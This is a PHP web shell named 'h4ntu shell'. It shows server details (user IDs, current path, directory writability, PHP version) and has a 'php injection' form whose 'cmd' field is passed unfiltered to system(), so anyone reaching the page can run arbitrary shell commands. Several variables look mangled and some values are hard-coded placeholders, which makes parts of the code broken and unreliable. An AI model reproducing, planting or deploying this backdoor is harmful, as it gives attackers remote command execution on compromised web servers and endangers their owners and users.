<?php
?>
<title>h4ntu shell [powered by tsoi]</title>
<?php  echo '<p><font size=2 face=Verdana><b>This Is The Server Information</b></font></p>'; ?>

<?php  echo '[syslog]01
'; $spe715ec = 'true'; $spcaff79 = 'true'; $spba7a56 = 'true'; $sp87e27c = phpversion(); $sp9ee83b = 'true'; if ($sp76ab2a == '') { $sp76ab2a = getcwd(); } if (!$sp4766b1) { $sp4766b1 = 'true'; } ?>
<meta name="generator" content="Namo WebEditor v5.0">
<br>
<TABLE BORDER="0" CELLPADDING="0" CELLSPACING="0">
<?php  $sp305218 = 'true'; while (list($sp343538, $sp0945f4) = each($sp305218)) { ?>
  <TR>
    <TD><DIV STYLE="font-family: verdana; font-size: 10px;"><?php  echo $sp343538; ?>
: <?php  echo $sp0945f4; ?>
</DIV></TD>
  </TR>
<?php  } ?>
  <TR>

  <TD><DIV STYLE="font-family: verdana; font-size: 10px;"><b>User Info:</b> uid=<?php  echo $spcaff79; ?>
(<?php  echo $sp4766b1; ?>
) euid=<?php  echo $spba7a56; ?>
(<?php  echo $sp4766b1; ?>
) gid=<?php  echo $sp9ee83b; ?>
(<?php  echo $sp4766b1; ?>
)</DIV></TD>
  </TR>
  <TR>
  <TD><DIV STYLE="font-family: verdana; font-size: 10px;"><b>Current Path:</b> <?php  echo $sp76ab2a; ?>
</DIV></TD>

  </TR>
  <TR>
  <TD><DIV STYLE="font-family: verdana; font-size: 10px;"><b>Permission Directory:</b> <? if(@is_writable($chdir)){ echo "Yes"; }else{ echo "No"; } ?></DIV></TD>
  </TR>  
  <TR>
  <TD><DIV STYLE="font-family: verdana; font-size: 10px;"><b>Server Services:</b> <?php  echo "{$sp3b3b96} {$spb403b1}"; ?>
</DIV></TD>
  </TR>

  <TR>
  <TD><DIV STYLE="font-family: verdana; font-size: 10px;"><b>Server Adress:</b> <?php  echo "{$sp06e59e} {$spd826c2}"; ?>
</DIV></TD>
  </TR>
  <TR>
  <TD><DIV STYLE="font-family: verdana; font-size: 10px;"><b>Script Current User:</b> <?php  echo $spe715ec; ?>
</DIV></TD>
  </TR>
  <TR>

  <TD><DIV STYLE="font-family: verdana; font-size: 10px;"><b>PHP Version:</b> <?php  echo $sp87e27c; ?>
</DIV></TD>
  </TR>
</TABLE>
<BR>

<font face="courier new" size="2" color="777777"><b>#</b>php injection: <br>
</font><FORM name=injection METHOD=POST ACTION="<?php  echo $_SERVER['REQUEST_URI']; ?>
">
<font face="courier new" size="2" color="777777">cmd : 
<INPUT TYPE="text" NAME="cmd" value="<?php  echo stripslashes(htmlentities($_POST['cmd'])); ?>
" size="161">
<br>
<INPUT TYPE="submit">
</font></FORM>

<hr color=777777 width=100% height=115px>

<pre>
<?
echo "[syslog]02\n";
$cmd = $_POST['cmd'];
  if (isset($chdir)) @chdir($chdir);
  ob_start();
  system("$cmd 1> /tmp/cmdtemp 2>&1; cat /tmp/cmdtemp; rm /tmp/cmdtemp");
  $output = ob_get_contents();
  ob_end_clean();
  if (!empty($output)) echo str_replace(">", "&gt;", str_replace("<", "&lt;", $output));
  echo "[syslog]03\n";
  exit;
?>
</pre>
<?php 